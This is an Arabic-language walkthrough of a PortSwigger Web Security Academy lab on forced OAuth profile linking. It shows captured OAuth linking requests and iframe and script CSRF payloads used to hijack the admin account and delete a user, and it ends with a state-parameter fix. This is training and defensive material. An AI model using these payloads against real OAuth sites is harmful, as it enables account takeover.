# [Forced OAuth profile linking](https://portswigger.net/web-security/oauth/lab-oauth-forced-oauth-profile-linking)

## **`الهدف`**
قم بشن هجوم `CSRF` لربط حسابك على موقع التواصل الاجتماعى بحساب `admin` على `blog website` ثم قم بالدخول إلى لوحة التحكم وقم بحذف حساب `carlos`.
## **`خطوات الحل`**
نقوم بتسجيل الدخول  بحساب `wiener:peter` بعد ذلك نقوم بالضغط على `My account` ثم نقوم بتشغيل `Intercept` داخل `Burrp` بعد ذلك نضغط `Attach a social profile` بحساب `peter.wiener:hotdog` ومن ثم نقوم بفحص تسلسل الـ  `requests` حتى نصل إلى هذا الـ `request` فنقوم بعمل `Drop` له لكي لا يتم استعمال الكود وحرقه.
```http
GET /oauth-linking?code=XnkLPQ-u3GCrBrnW1HgYv_KUhE1_egbG1y2vmQCsjb4 HTTP/2
Host: 0a7000bc041f099580fcdfad00750081.web-security-academy.net
Cookie: session=mqlvwWQKgdHiXnnXZqz61Wb8aTkrDBKG

```

بعد ذلك سنقوم بالتوجه إلى السيرفر الموجود في اللاب ونقوم بوضع إحدي الأكواد التالية في الـ `Body` مع تغيير الـ `URL` الخاص باللاب الحالي ووضع الـ `Linking-CODE` الموجود في الـ `request` السابق.
```html
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/oauth-linking?code=Linking-CODE"></iframe>
```

```html
<script>
    window.location = "https://0a7000bc041f099580fcdfad00750081.web-security-academy.net/oauth-linking?code=XnkLPQ-u3GCrBrnW1HgYv_KUhE1_egbG1y2vmQCsjb4";
</script>
```

بعد ذلك نقوم بالضغط على `Store` ثم `Deliver exploit to victim` ثم نقوم بتسجل الخروج من الحساب.

ونقوم بعمل تسجيل دخول من جديد ولكن عن طريق خيار `Login with social media` ونكمل تسجيل الدخول لنجد أنفسنا في حساب `Admin` فنتوجه إلى لوحة التحكم ونقوم بحذف حساب `carlos` لننتهي من حل اللاب.
## **`ترقيع الثغرة`**
يجب استعمال معلم `state` وأن يكون رمزاً سرياً، عشوائياً، وغير قابل للتخمين، وأن يتم ربطه بجلسة المستخدم `Session` على السيرفر، ويجب أن يرفض السيرفر أي طلب يخص `OAuth` لا يحتوي على الـ `state`، أو يحتوي على `state` مختلف عن المربوط بالـ `Session` على السيرفر، ويرفضه **قبل** أن يقوم حتى باستخدام الـ `code`.
